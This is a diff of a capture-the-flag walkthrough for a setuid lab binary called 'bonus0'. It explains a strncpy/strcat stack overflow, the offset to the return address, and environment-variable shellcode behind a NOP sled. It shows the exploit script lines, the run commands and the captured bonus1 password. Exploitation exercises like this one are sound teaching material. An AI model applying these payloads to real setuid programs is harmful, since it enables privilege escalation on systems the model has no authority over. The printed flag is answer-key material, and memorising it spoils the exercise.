@@ -4,48 +4,43 @@ bonus0 - walkthrough
 Target: /home/user/bonus0/bonus0   (setuid + setgid bonus1)
 Goal:   read /home/user/bonus1/.pass
 
-1. Recon (objdump -d bonus0)
-   p(dest, prompt):
-     read(0, buf[4096]);  strchr(buf,'\n') -> '\0';  strncpy(dest, buf, 20)
-     -> strncpy copies EXACTLY 20 bytes and does not NUL-terminate.
-   pp(dest):
-     char a[20], b[20];   // adjacent (ebp-0x30, ebp-0x1c)
-     p(a," - "); p(b," - ");
-     strcpy(dest, a);              // a not terminated -> spills into b
-     dest[strlen(dest)] = ' ';     // 2-byte separator " " (word @ 0x80486a4)
+1. The bug
+   p(dest, prompt) does read() into a big buffer, cuts at the first '\n', then
+   strncpy(dest, buf, 20). strncpy does NOT NUL-terminate on a full 20-byte
+   copy. pp() fills two adjacent 20-byte buffers a and b this way, then:
+     strcpy(dest, a);            ; a unterminated -> keeps reading into b
+     dest[strlen(dest)] = ' ';   ; 2-byte separator
      strcat(dest, b);
-   main(): passes a ~42-byte stack buffer to pp(), then puts() it.
+   main passes a ~42-byte buffer as dest, so the concatenation overruns it and
+   overwrites main's saved return address.
 
-2. The bug
-   Two 20-byte inputs are concatenated into main's small buffer with no size
-   check, overflowing the saved return address.
+   p() uses read(), which grabs everything available at once. The two prompts
+   are separate reads, so the two lines must be sent with a pause between them,
+   or the first read() eats both and the second hits EOF (crash in strchr).
 
-   IMPORTANT: p() uses read(), which grabs everything available at once. The
-   two prompts are separate reads, so the two lines must be sent with a short
-   pause between them, otherwise the first read() eats both and the second
-   read() gets EOF (crash in strchr).
+2. Offset
+   Send input1 = 20 A's, input2 = a cyclic pattern (with a pause between). The
+   crash EIP locates the saved return address at bytes 9..12 of the SECOND
+   input.
 
-3. Find the offset
-   input1 = "A"*20 ,  input2 = "BBBBCCCCDDDDEEEEFFFF..."  (pause between)
-     -> EIP = 0x45444444 ("DDDE")
-   Locating that in input2 shows the return address occupies input2[9..12].
+3. Shellcode in an env var (ASLR is off)
+   The two inputs are far too small for shellcode, so put it behind a NOP sled
+   in an env var and return into the sled. Landing anywhere in the 500-byte
+   sled slides down into the shellcode, so the address need not be exact.
 
-4. Shellcode placement (ASLR is off: randomize_va_space = 0)
-   The inputs are far too small for shellcode, so we stash it in an environment
-   variable behind a big NOP sled and return into the sled:
-     EGG = "\x90"*500 + execve("/bin//sh","-c","/bin/cat /home/user/bonus1/.pass")
-   Under gdb the sled was found spanning ~0xbffffc82 upward; returning to
-   0xbffffd80 (mid-sled) is safe (bytes 80 fd ff bf: no NUL, no '\n').
+4. Payload  (Ressources/exploit.py)
+     shell_code = b"\x90"*500 + asm(shellcraft.i386.sh())   # -> file "scode"
+     line1 = b"A"*20 + b"\n"                                 # keeps offset at 9
+     line2 = b"A"*9 + p32(0xbffffda0) + b"A"*7 + b"\n"       # ret at offset 9
+   0xbffffda0 is a mid-sled address; it depends on the environment, so re-find
+   it after exporting: gdb ./bonus0 -> run -> print/x getenv("EGG").
 
-5. Payload
-   input1 = "A"*20                                  (keeps the offset at 9)
-   input2 = "A"*9 + \x80\xfd\xff\xbf + "A"*7         (ret at offset 9)
-
-     export EGG="$(python -c 'print "\x90"*500 + "<shellcode>"')"
-     ( printf 'AAAAAAAAAAAAAAAAAAAA\n'; sleep 1;
-       printf 'AAAAAAAAA\x80\xfd\xff\xbfAAAAAAA\n'; sleep 1 ) | ./bonus0
-
-   Returning into the sled runs the shellcode, which cats the flag.
+5. Run
+     $ python3 Ressources/exploit.py
+     $ export EGG="$(cat scode)"
+     $ (cat line1; sleep 1; cat line2; sleep 1; echo 'cat /home/user/bonus1/.pass') | ./bonus0
+   main returns into the sled, the shellcode spawns /bin/sh, and the command
+   left in the pipe cats the flag.
 
 6. Result -- bonus1 password:
    cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
